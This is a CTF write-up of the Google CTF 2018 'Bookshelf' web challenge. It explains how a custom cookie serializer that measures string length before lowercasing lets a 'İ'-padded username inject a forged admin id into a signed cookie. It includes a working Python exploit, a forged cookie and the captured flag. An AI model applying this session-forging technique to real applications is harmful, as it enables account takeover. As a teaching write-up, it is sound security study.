# Writeup Bookshelf from Google Capture The Flag 2018 (Quals)

## Challenge 

> Organize those rectangular things that take physical space!
>
> https://books.web.ctfcompetition.com/
>
> https://storage.googleapis.com/gctf-2018-attachments/21f658d0ceb5dedbf58549a8912676d95c426eb10c708c141f578a897d24eddc
  
A website is given along with its source where you can create an account and add books with some metadata.

The source is quite extensive but most of it is unimportant for this challenge.

First, let's look at the registration process:

```js
function h(s) {
    const hash = crypto.createHash('sha256');
    hash.update(s+'');
    return hash.digest('hex');
}

router.post('/register',
  images.multer.single('image'),
  images.sendUploadToGCS,
  async (req, res, next) => {
    try {
        let data = req.body;

        let u = await userModel.get(h(data.name));

        if (u) {
            res.status(400).send('User exists.');
            return;
        }

        if (req.file && req.file.cloudStoragePublicUrl) {
          data.image = req.file.cloudStoragePublicUrl;
        }

        if (data.name === 'admin') {
            res.status(503).send('Nope!');
            return;
        }

        data.age = data.age | 0;

        if (data.age < 18) {
            res.status(503).send('You are too young!');
            return;
        }

        data.password = h(data.password);

        userModel.update(h(data.name), data, () => {
            res.redirect('/');
        });
    } catch (e) {
        next(e);
    }
});
```

So, we will most likely need to login as admin.
Passwords are hashed with sha256.
The admin will have `id = sha256("admin")`.
Login is as follows:

```js
router.post('/login', async (req, res, next) => {
    let data = req.body;

    let u = await userModel.get(h(data.name));

    if (!u || u.password !== h(data.password)) {
        res.status(403).send('Invalid login.');
        return;
    }

    req.user = u;
    next();

}, auth.required, (req, res, next) => {
    res.redirect('/');
});

function authRequired(req, res, next) {
  if (!req.user) {
    return res.redirect('/user/login');
  } else if (!req.cookies.auth) {
      res.cookie('auth', bwt.encode(req.user));
  }
  next();
}

router.use((req, res, next) => {
    if (req.cookies.auth) {
        let user = bwt.decode(req.cookies.auth);
        if (user)
            req.user = user;
    }
    next();
});

function pint(n) {
    let b = new Buffer(4)
    b.writeInt32LE(n)
    return b
}

function encode(o, KEY) {
    let b = new Buffer(0)

    for (let k in o) {
        let v = o[k]

        b = Buffer.concat([b, pint(k.length), Buffer.from(k)])

        switch(typeof v) {
            case "string":
                b = Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])
                break
            case 'number':
                b = Buffer.concat([b, Buffer.from([2]), pint(v)])
                break
            default:
                b = Buffer.concat([b, Buffer.from([0])])
                break
        }
    }

    b = b.toString('base64')

    const hmac = crypto.createHmac('sha256', KEY)
    hmac.update(b)
    let s = hmac.digest('base64')

    return b + '.' + s
}

function decode(payload, KEY) {
    let [b, s] = payload.split('.')

    const hmac = crypto.createHmac('sha256', KEY)
    hmac.update(b)
    if (s !== hmac.digest('base64')) {
        return null;
    }

    let o = {}
    let i = 0
    b = new Buffer(b, 'base64')

    while (i < b.length) {
        n = b.readUInt32LE(i), i += 4
        k = b.toString('utf8', i, i+n), i += n
        t = b.readUInt8(i), i += 1

        switch(t) {
            case 1:
                n = b.readUInt32LE(i), i += 4
                v = b.toString('utf8', i, i+n), i += n
                o[k] = v
                break
            case 2:
                n = b.readUInt32LE(i), i += 4
                o[k] = n
                break
            default:
                break
        }
    }
    return o
}
```

So, after successful login, the user receives a cookie consisting of the user object, 
serialized using a custom format together with an HMAC.
For each request, the user object is deserialized from the cookie and its HMAC checked.

The object stored in the cookie looks as follows:

```json
{
  "password": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
  "age": 100,
  "desc": "",
  "image": "https://storage.googleapis.com/ctf-books/1530206804506icon.png",
  "name": "upb2",
  "imageUrl": "",
  "id": "4b64f59360224e5dcfe4c6ec16cf9e71224f614e871b546a36f2d17b3ed64671"
}
```

Our goal will be to change the id to that of admin.

## Vulnerability

The custom serialization functions are suspicious (*why not just use json?*).
Notice how strings are always serialized in lower case `Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])`.
Also, the string's byte length is calculated before converting it to lower case.

As a sidenote, if we register as `AdMiN`, the name `admin` will be displayed on the page after login.
But that is useless since we get a different id.

Now, if `toLowerCase` would increase the byte length, we could control the header of the next property.
It turns out, there is indeed such a character.
We can find it in unicode's [SpecialCasing.txt](ftp://ftp.unicode.org/Public/UCD/latest/ucd/SpecialCasing.txt)
Note that we can only use those mappings that are not restricted to a certain locale (they are used with `toLocaleLowerCase`).
We find:

```nohighlight
# <code>; <lower>; <title>; <upper>; (<condition_list>;)? # <comment>
0130; 0069 0307; 0130; 0130; # LATIN CAPITAL LETTER I WITH DOT ABOVE
```

We can observe that behaviour in javascript:

```js
const s = "\u0130", sl = s.toLowerCase()
console.log(s, sl, Buffer.byteLength(s), Buffer.byteLength(sl))
// > İ i̇ 2 3
```

## Exploit

The idea is to use the name `İİ...{id: "<admin_id>"}{x: "<capture original id>"}` where the length of the `İ`s 
is such that everything afterwards is "pushed" out of the id string.
This requires that the `id` field follows directly after the `name` field in the cookie which is not always the case. 
We achieved best results when registering with python requests and only supplying the needed fields.
Still, not every cookie was usable and we needed multiple attempts.
Furthermore, the name has to be a valid UTF-8 string. 

```python
import requests
import random
from urllib.parse import unquote
from base64 import b64decode

prefix = f"{random.randint(0, 0xffffffff):08x}"  # random prefix for repeated attempts

def register(name):
    res = requests.post("https://books.web.ctfcompetition.com/user/register", {
        "name": name,
        "password": "123",
        "age": "123"
    })
    assert "Welcome to the Bookshelf, here you can organize your books" in res.text

    res = requests.post("https://books.web.ctfcompetition.com/user/login", {
        "name": name,
        "password": "123"
    }, allow_redirects=False)

    auth_cookie = unquote(res.cookies["auth"])
    print(auth_cookie)
    user, checksum = map(b64decode, auth_cookie.split("."))
    print(user)

def p(i):
    return chr(i) + "\0"*3

admin_id = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"  # == sha1("admin")

pl = p(2) + "id" + "\x01" + p(len(admin_id)) + admin_id  # serialized form of {"id": admin_id}
pl += p(1) + "x" + "\x01" + p(len(pl))  # header of {"x": ...} to capture the original id entry into a string as to not overwrite the new one
pl = prefix + "İ"*len(pl) + pl

register(pl)
print(pl.encode())
```

Output:
```nohighlight
CAAAAHBhc3N3b3JkAUAAAABhNjY1YTQ1OTIwNDIyZjlkNDE3ZTQ4NjdlZmRjNGZiOGEwNGExZjNmZmYxZmEwN2U5OThlODZmN2Y3YTI3YWUzAwAAAGFnZQJ7AAAABAAAAG5hbWUBBwEAADkzNzUxOWQ4acyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHAgAAAGlkAUAAAAA4YzY5NzZlNWI1NDEwNDE1YmRlOTA4YmQ0ZGVlMTVkZmIxNjdhOWM4NzNmYzRiYjhhODFmNmYyYWI0NDhhOTE4AQAAAHgBawAAAAIAAABpZAFAAAAAODMyYjYxN2YwM2I1NWE2ZGJkYmEzMDI2NDgxZTc3YjVlMDA4MjNiZDhhMTk0NjA4M2ZkOGJhMDIzN2RmNjYyNQ==.TSM9ub1YRK2B3PTPlXU8D3xxHN8LFEorJgxbWlNgZNs=
b'\x08\x00\x00\x00password\x01@\x00\x00\x00a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3\x03\x00\x00\x00age\x02{\x00\x00\x00\x04\x00\x00\x00name\x01\x07\x01\x00\x00937519d8i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87i\xcc\x87\x02\x00\x00\x00id\x01@\x00\x00\x008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\x01\x00\x00\x00x\x01k\x00\x00\x00\x02\x00\x00\x00id\x01@\x00\x00\x00832b617f03b55a6dbdba3026481e77b5e00823bd8a1946083fd8ba0237df6625'
b'937519d8\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\xc4\xb0\x02\x00\x00\x00id\x01@\x00\x00\x008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\x01\x00\x00\x00x\x01K\x00\x00\x00'
```

Deserialized cookie:
```json
{
  "password": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
  "age": 123,
  "name": "937519d8i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307i\u0307",
  "id": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
  "x": "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000832b617f03b55a6dbdba3026481e77b5e00823bd8a1946083fd8ba0237df6625"
}
```

Now we can login as admin:

```python
import requests

auth_cookie = "CAAAAHBhc3N3b3JkAUAAAABhNjY1YTQ1OTIwNDIyZjlkNDE3ZTQ4NjdlZmRjNGZiOGEwNGExZjNmZmYxZmEwN2U5OThlODZmN2Y3YTI3YWUzAwAAAGFnZQJ7AAAABAAAAG5hbWUBBwEAADkzNzUxOWQ4acyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHacyHAgAAAGlkAUAAAAA4YzY5NzZlNWI1NDEwNDE1YmRlOTA4YmQ0ZGVlMTVkZmIxNjdhOWM4NzNmYzRiYjhhODFmNmYyYWI0NDhhOTE4AQAAAHgBawAAAAIAAABpZAFAAAAAODMyYjYxN2YwM2I1NWE2ZGJkYmEzMDI2NDgxZTc3YjVlMDA4MjNiZDhhMTk0NjA4M2ZkOGJhMDIzN2RmNjYyNQ==.TSM9ub1YRK2B3PTPlXU8D3xxHN8LFEorJgxbWlNgZNs="

res = requests.get("https://books.web.ctfcompetition.com/books/mine", cookies={"auth": auth_cookie})
print(res.text)
```

The page contains a link to a [book](https://books.web.ctfcompetition.com/books/5eab1600-b86e-4ebc-af0f-7d9f618c41c3) called "FLAG" 
which has the flag `CTF{1892b0d8bc93d7e4ca98975f47f8c7d8}` in its description.